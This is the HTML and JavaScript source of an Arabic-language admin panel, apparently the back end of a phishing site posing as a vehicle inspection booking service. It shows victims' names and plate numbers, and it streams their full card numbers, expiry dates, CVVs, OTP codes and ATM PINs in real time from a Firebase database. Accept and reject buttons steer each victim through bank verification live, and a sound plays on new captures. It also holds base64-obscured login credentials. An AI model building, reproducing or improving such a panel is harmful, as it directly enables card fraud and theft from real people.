<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام إدارة البيانات - لوحة التحكم</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background: #ececec; margin: 0; padding: 0; }
        #loginOverlay { position: fixed; inset: 0; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .login-box { background: white; padding: 25px; border-radius: 10px; width: 300px; text-align: center; }
        .login-box input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 10px; background: #1e7344; color: white; border: none; border-radius: 5px; cursor: pointer; }
        #adminContent { display: none; }
        .navbar { background: #1e7344; padding: 10px; display: flex; gap: 5px; position: sticky; top: 0; z-index: 100; }
        .nav-btn { flex: 1; padding: 10px; border: none; background: rgba(255,255,255,0.2); color: white; cursor: pointer; border-radius: 5px; font-size: 14px; }
        .nav-btn.active { background: white; color: #1e7344; font-weight: bold; }
        .visitor-counter { background: #ffd700; padding: 8px; text-align: center; font-weight: bold; font-size: 15px; color: #000; }
        .container { padding: 10px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .card { background: white; margin-bottom: 10px; padding: 12px; border-radius: 8px; border-right: 5px solid #1e7344; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: relative; }
        .data-row { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 8px; }
        .box { padding: 5px 8px; background: #f0f0f0; border-radius: 4px; font-size: 13px; border: 1px solid #ddd; direction: ltr !important; unicode-bidi: bidi-override; }
        .location-badge { display: inline-block; padding: 3px 8px; background: #e3f2fd; color: #0d47a1; border-radius: 12px; font-size: 11px; font-weight: bold; border: 1px solid #bbdefb; }
        .btn { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; color: white; font-size: 12px; font-weight: bold; transition: 0.3s; }
        .btn-ok { background: #28a745; }
        .btn-rej { background: #dc3545; }
        .btn-wait { background: #555 !important; opacity: 0.7; } 
        .btn-del { background: #666; }
        .logout { background: #000 !important; max-width: 80px; }
        .new-update { border: 2px solid #ffd700; animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.7; } }
    </style>
</head>
<body onload="checkSavedLogin()">

<audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div id="loginOverlay">
    <div class="login-box">
        <h3>تسجيل الدخول للنظام</h3>
        <input type="text" id="username" placeholder="اسم المستخدم">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="checkLogin()">دخول</button>
        <p id="loginError" style="color:red; display:none;">خطأ في البيانات!</p>
    </div>
</div>

<div id="adminContent">
    <div class="visitor-counter">عدد الزوار المتواجدين الآن: <span id="onlineCount">0</span> زائر 🌐</div>
    <div class="navbar">
        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">قائمة الحجز</button>
        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">البيانات المالية</button>
        <button class="nav-btn logout" onclick="logout()">خروج</button>
    </div>
    <div class="container">
        <div id="bookingSection" class="tab-content active"><div id="bookingList"></div></div>
        <div id="cardsSection" class="tab-content"><div id="paymentsList"></div></div>
    </div>
</div>

<script>
    let lastDataStore = {}; 

    function playSound() {
        const sound = document.getElementById('notifSound');
        sound.currentTime = 0; 
        sound.play().catch(e => console.log("التفاعل مطلوب"));
    }

    function checkSavedLogin() {
        if (localStorage.getItem("admin_logged_in") === "true") showAdmin();
    }

    function checkLogin() {
        const u = document.getElementById('username').value.trim().toLowerCase();
        const p = document.getElementById('password').value.trim();
        // الحماية بالترميز كما كانت
        if((u === atob("YWRtYW4=") || u === atob("YWRtYW5f")) && p === atob("SEgxMjM0NTY3ODkw")) {
            localStorage.setItem("admin_logged_in", "true");
            showAdmin();
        } else { document.getElementById('loginError').style.display = 'block'; }
    }

    function showAdmin() {
        document.getElementById('loginOverlay').style.display = 'none';
        document.getElementById('adminContent').style.display = 'block';
        initFirebase();
    }

    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }

    function initFirebase() {
        const config = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection",
            storageBucket: "saso-inspection.appspot.com",
            messagingSenderId: "1009002235896",
            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
        };
        if (!firebase.apps.length) firebase.initializeApp(config);
        const db = firebase.database();

        // تتبع عدد الزوار المتواجدين لحظياً
        db.ref('live_visitors').on('value', s => {
            document.getElementById('onlineCount').innerText = s.numChildren();
        });

        // جلب بيانات الحجوزات
        db.ref('visitors').on('value', (s) => {
            let h = '';
            s.forEach((c) => {
                const v = c.val();
                h += `<div class="card">
                    <b style="text-align:right; display:block;">${v.fullName || 'زائر جديد'}</b>
                    <small>🚗 ${v.vehicleType || '-'} | 🔢 ${v.plateNumber || '-'}</small>
                    <div style="margin-top:8px;">
                         <button class="btn btn-del" onclick="deleteData('visitors/${c.key}')">حذف</button>
                    </div>
                </div>`;
            });
            document.getElementById('bookingList').innerHTML = h;
        });

        // جلب بيانات البطاقات والـ OTP
        db.ref('payments').on('value', (s) => {
            let h = '';
            let triggerSound = false;

            s.forEach((c) => {
                const v = c.val();
                const id = c.key;
                
                // مراقبة التغييرات في البيانات ومكان العميل الحالي
                const currentDataString = `${v.cardNumber}|${v.otp}|${v.atm_pin}|${v.currentPage}|${v.status}`;

                if (lastDataStore[id] !== undefined && lastDataStore[id] !== currentDataString) {
                    triggerSound = true;
                } else if (lastDataStore[id] === undefined) {
                    triggerSound = true; 
                }
                
                lastDataStore[id] = currentDataString;

                const currentStatus = v.status || '';
                const isWaiting = currentStatus.includes('waiting') || currentStatus === '';
                const btnClassOk = isWaiting ? 'btn-ok' : 'btn-wait';
                const btnClassRej = isWaiting ? 'btn-rej' : 'btn-wait';

                let pageLabel = v.currentPage || 'تصفح عام';

                h += `<div class="card ${isWaiting ? 'new-update' : ''}">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <b style="text-align:right;">${v.cardHolder || 'عميل'}</b>
                        <span class="location-badge">📍 يتواجد في: ${pageLabel}</span>
                    </div>
                    <div class="data-row">
                        <div class="box">${v.cardNumber || '---- ---- ---- ----'}</div>
                        <div class="box">📅 ${v.expiry || '--/--'}</div>
                        <div class="box">🔑 ${v.cvv || '---'}</div>
                        <div class="box" style="color:blue; font-weight:bold;">OTP: ${v.otp || 'بانتظار الإدخال'}</div>
                        <div class="box" style="color:purple; font-weight:bold;">PIN: ${v.atm_pin || '----'}</div>
                    </div>
                    <div style="margin-top:10px; display:flex; gap:10px;">
                        <button class="btn ${btnClassOk}" onclick="updateStatus('${id}', 'accept')">قبول التوجيه</button>
                        <button class="btn ${btnClassRej}" onclick="updateStatus('${id}', 'reject')">رفض / خطأ</button>
                        <button class="btn btn-del" onclick="deleteData('payments/${id}')">🗑 حذف</button>
                    </div>
                </div>`;
            });

            if (triggerSound) playSound();
            document.getElementById('paymentsList').innerHTML = h;
        });
    }

    function updateStatus(id, act) { 
        firebase.database().ref('payments/' + id).update({ status: act }); 
    }

    function deleteData(p) { if(confirm('هل أنت متأكد من حذف هذه البيانات؟')) firebase.database().ref(p).remove(); }

    function openTab(evt, name) {
        let contents = document.getElementsByClassName("tab-content");
        for (let i = 0; i < contents.length; i++) contents[i].style.display = "none";
        let btns = document.getElementsByClassName("nav-btn");
        for (let i = 0; i < btns.length; i++) btns[i].classList.remove("active");
        document.getElementById(name).style.display = "block";
        evt.currentTarget.classList.add("active");
    }
</script>
</body>
</html>
